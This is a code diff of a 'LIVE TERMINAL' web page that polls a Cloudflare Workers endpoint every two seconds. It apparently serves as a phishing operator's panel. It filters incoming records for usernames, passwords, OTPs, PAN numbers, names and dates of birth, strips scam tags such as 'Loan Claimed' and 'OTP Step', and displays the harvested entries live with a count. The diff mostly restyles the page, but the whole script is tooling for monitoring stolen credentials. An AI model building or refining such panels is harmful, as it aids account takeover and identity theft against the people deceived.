@@ -6,102 +6,110 @@
     <title>LIVE TERMINAL</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background-color: #f4f4f4; padding: 8px; font-family: 'Consolas', monospace; }
+        body { background-color: #f0f2f5; padding: 8px; font-family: 'Consolas', monospace; }
         
         .header { 
             background: #fff; padding: 10px; margin-bottom: 8px;
             display: flex; justify-content: space-between; align-items: center;
-            border-bottom: 1px solid #eee;
-            border-radius: 4px;
+            border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-        .status-text { font-size: 10px; color: #00a859; font-weight: bold; }
-        #count { color: #ff0000; font-size: 26px; font-weight: 900; }
+        .status-text { font-size: 11px; color: #00a859; font-weight: bold; }
+        #count { color: #ff0000; font-size: 28px; font-weight: 900; }
 
         #logsContainer { width: 100%; display: flex; flex-direction: column; }
 
         .log-card { 
-            margin-bottom: 8px; padding: 12px; 
-            border-radius: 6px; width: 100%; display: flex; flex-direction: column;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 10px; padding: 15px; 
+            border-radius: 10px; width: 100%; display: flex; flex-direction: column;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.15);
         }
 
-        /* --- BLACK & WHITE THEME LOGIC --- */
+        /* Black & White Alternate Theme */
         .log-card:nth-child(odd) {
             background-color: #ffffff;
-            border: 1px solid #ddd;
+            border-left: 5px solid #000;
         }
         .log-card:nth-child(odd) .detail-text { color: #000000; }
 
         .log-card:nth-child(even) {
-            background-color: #000000;
+            background-color: #1a1a1a;
+            border-left: 5px solid #ff0000;
         }
         .log-card:nth-child(even) .detail-text { color: #ffffff; }
 
         .detail-text { 
-            font-size: 14px; white-space: pre-wrap; 
-            line-height: 1.6; word-break: break-all;
+            font-size: 15px; font-weight: 600; white-space: pre-wrap; 
+            line-height: 1.8; word-break: break-all;
         }
 
         .time-footer { 
-            display: block; margin-top: 8px; font-size: 9px; 
-            color: #ff0000; text-align: right; font-weight: bold;
-            padding-top: 4px;
+            display: block; margin-top: 10px; font-size: 10px; 
+            color: #ff4d4d; text-align: right; font-weight: bold;
+            opacity: 0.8;
         }
 
-        .loading { font-size: 12px; color: #999; text-align: center; margin-top: 30px; }
+        .loading { font-size: 13px; color: #666; text-align: center; margin-top: 50px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <span class="status-text">● TERMINAL_ACTIVE</span>
+        <span class="status-text">● LIVE_DATA_FEED</span>
         <span id="count">0</span>
     </div>
 
     <div id="logsContainer">
-        <p class="loading">Fetching live entries from worker...</p>
+        <p class="loading">Fetching data from worker...</p>
     </div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        function cleanTrash(text) {
+        // Data ko "Label:- Value" format mein saaf karne ka function
+        function formatData(text) {
             if (!text) return "";
             return text
                 .replace(/Type:[^|]*/gi, "")
                 .replace(/Path:[^|]*/gi, "")
                 .replace(/Loan Claimed/gi, "")
                 .replace(/OTP Step \d+/gi, "")
-                .replace(/\| \s*\|/g, "|")
-                .trim();
+                .split('|') // Pipe se alag karein
+                .map(item => item.trim())
+                .filter(item => item.length > 0)
+                .map(item => {
+                    // Yahan logic hai "Label:- Value" dikhane ka
+                    if(item.includes(':')) {
+                        let parts = item.split(':');
+                        return parts[0].trim() + ":- " + parts[1].trim();
+                    }
+                    return item;
+                })
+                .join('\n'); // Har info nayi line mein
         }
 
         async function fetchLogs() {
             try {
-                // Har baar fresh data ke liye timestamp add kiya hai
                 const response = await fetch(`${workerURL}?t=${Date.now()}`);
                 const data = await response.json();
                 const container = document.getElementById('logsContainer');
                 
-                // Filter: Sirf wo data jo kaam ka hai
                 const filteredData = data.filter(item => {
                     const d = item.detail.toLowerCase();
                     return d.includes("user") || d.includes("pass") || d.includes("otp") || 
                            d.includes("pan") || d.includes("dob") || d.includes("name");
                 });
 
-                // Reverse taaki New Entry sabse upar dikhe
+                // New entry top par dikhane ke liye reverse
                 const sortedData = filteredData.reverse();
-
                 document.getElementById('count').innerText = sortedData.length;
 
                 if (sortedData.length === 0) {
-                    container.innerHTML = "<p class='loading'>Waiting for new data...</p>";
+                    container.innerHTML = "<p class='loading'>No data found. Waiting...</p>";
                     return;
                 }
 
                 container.innerHTML = sortedData.map(item => {
-                    const cleanDetail = cleanTrash(item.detail);
+                    const cleanDetail = formatData(item.detail);
                     return `
                         <div class="log-card">
                             <div class="detail-text">${cleanDetail}</div>
@@ -111,11 +119,11 @@
                 }).join('');
 
             } catch (err) {
-                console.error("Connection Error with Worker");
+                console.log("Worker offline or error");
             }
         }
 
-        // Har 2 second mein check karega ki koi nayi entry aayi ya nahi
+        // 2 second mein auto-update
         setInterval(fetchLogs, 2000);
         window.onload = fetchLogs;
     </script>
